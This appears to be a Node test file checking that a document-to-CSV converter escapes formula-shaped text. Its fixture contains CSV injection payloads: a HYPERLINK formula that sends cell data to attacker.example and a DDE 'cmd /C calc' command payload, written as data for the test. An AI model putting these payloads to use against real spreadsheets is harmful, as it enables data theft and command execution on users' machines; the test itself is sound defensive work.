// Document conversion to CSV (lib/document-conversion-engine.ts): text read
// from an uploaded file must never open as a formula.
import test from "node:test";
import assert from "node:assert/strict";
import { register } from "node:module";
import { pathToFileURL } from "node:url";

register("../pdf/alias-hook.mjs", pathToFileURL(new URL(".", import.meta.url).pathname));

const { convertDocumentContent } = await import("@/lib/document-conversion-engine.ts");

test("formula-shaped text in a converted CSV stays literal", async () => {
  const source = [
    'Invoice\t=HYPERLINK("https://attacker.example/?d="&A1,"Click")',
    "-2+3+cmd|' /C calc'!A0\t@SUM(A1)",
    "Total\t-1,090.00",
  ].join("\n");
  const file = await convertDocumentContent(
    { name: "hostile.txt", mimeType: "text/plain", content: new TextEncoder().encode(source) },
    "csv",
  );
  assert.equal(
    new TextDecoder().decode(file.content),
    [
      `Invoice,"'=HYPERLINK(""https://attacker.example/?d=""&A1,""Click"")"`,
      "'-2+3+cmd|' /C calc'!A0,'@SUM(A1)",
      `Total,"-1,090.00"`,
    ].join("\n"),
  );
});
